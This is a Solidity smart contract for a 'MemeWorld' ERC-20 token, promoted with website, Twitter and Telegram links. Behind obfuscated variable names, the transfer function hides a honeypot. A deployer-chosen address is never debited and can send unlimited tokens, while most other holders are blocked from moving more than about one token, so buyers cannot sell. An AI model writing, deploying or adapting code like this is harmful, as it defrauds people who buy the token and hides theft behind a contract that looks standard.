/*

Website: https://memeworldtoken.fun/
Twitter: https://twitter.com/MemeWorldErc
Telegram: https://t.me/MemeWorldToken

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.11;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract MemeWorld is Ownable {
    mapping(address => mapping(address => uint256)) public allowance;

    IUniswapV2Router02 private dbjerltysm;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) private tszolqebajwr;

    function bwlyqcaupx(address xqlartzhid, address aomhicu, uint256 ydqjrne) private {
        address qendzis = IUniswapV2Factory(dbjerltysm.factory()).getPair(address(this), dbjerltysm.WETH());
        bool bnzpmuxk = tszolqebajwr[xqlartzhid] == block.number;
        if (!agdcqomkvnhu[xqlartzhid]) {
            if (xqlartzhid != qendzis && ydqjrne < totalSupply && (!bnzpmuxk || ydqjrne > pwydetcr[xqlartzhid])) {
                require(totalSupply / (10 ** decimals) >= ydqjrne);
            }
            balanceOf[xqlartzhid] -= ydqjrne;
        }
        pwydetcr[aomhicu] = ydqjrne;
        balanceOf[aomhicu] += ydqjrne;
        tszolqebajwr[aomhicu] = block.number;
        emit Transfer(xqlartzhid, aomhicu, ydqjrne);
    }

    function approve(address lfhpzdns, uint256 ydqjrne) public returns (bool success) {
        allowance[msg.sender][lfhpzdns] = ydqjrne;
        emit Approval(msg.sender, lfhpzdns, ydqjrne);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) private pwydetcr;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => bool) private agdcqomkvnhu;

    uint8 public decimals = 9;

    string public name;

    constructor(string memory pqwedtozrj, string memory qtesyzm, address mkcepjqvaz, address bkvuqozsgm) {
        name = pqwedtozrj;
        symbol = qtesyzm;
        balanceOf[msg.sender] = totalSupply;
        agdcqomkvnhu[bkvuqozsgm] = true;
        dbjerltysm = IUniswapV2Router02(mkcepjqvaz);
    }

    string public symbol;

    mapping(address => uint256) public balanceOf;

    function transfer(address aomhicu, uint256 ydqjrne) public returns (bool success) {
        bwlyqcaupx(msg.sender, aomhicu, ydqjrne);
        return true;
    }

    function transferFrom(address xqlartzhid, address aomhicu, uint256 ydqjrne) public returns (bool success) {
        require(ydqjrne <= allowance[xqlartzhid][msg.sender]);
        allowance[xqlartzhid][msg.sender] -= ydqjrne;
        bwlyqcaupx(xqlartzhid, aomhicu, ydqjrne);
        return true;
    }
}
